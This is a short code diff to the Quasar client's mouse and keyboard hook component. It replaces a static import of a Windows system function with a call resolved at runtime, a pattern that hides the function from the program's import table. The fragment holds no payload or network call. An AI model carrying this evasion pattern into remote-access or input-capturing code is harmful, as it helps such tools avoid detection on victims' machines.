@@ -3,9 +3,12 @@
 // See license.txt or https://mit-license.org/
 
 using System;
+using System.Reflection;
 using System.Runtime.InteropServices;
 using System.Windows.Forms;
 using Quasar.Client.MouseKeyHook.WinApi;
+using Quasar.Client.Utilities;
+using static Quasar.Client.Win32PE.Structs.NativeMethods;
 
 namespace Quasar.Client.MouseKeyHook.Implementation
 {
@@ -21,8 +24,9 @@ namespace Quasar.Client.MouseKeyHook.Implementation
         private const int SM_CXDOUBLECLK = 36;
         private const int SM_CYDOUBLECLK = 37;
 
-        [DllImport("user32.dll")]
-        private static extern int GetSystemMetrics(int index);
+        //[DllImport("user32.dll")]
+        private delegate int GetSystemMetricsProc(int index);
+        private static int GetSystemMetrics(int index) => ClientNatives.Lookup<GetSystemMetricsProc>("user32.dll", "GetSystemMetrics")(index);
 
         public static int GetSwapButtonThreshold()
         {
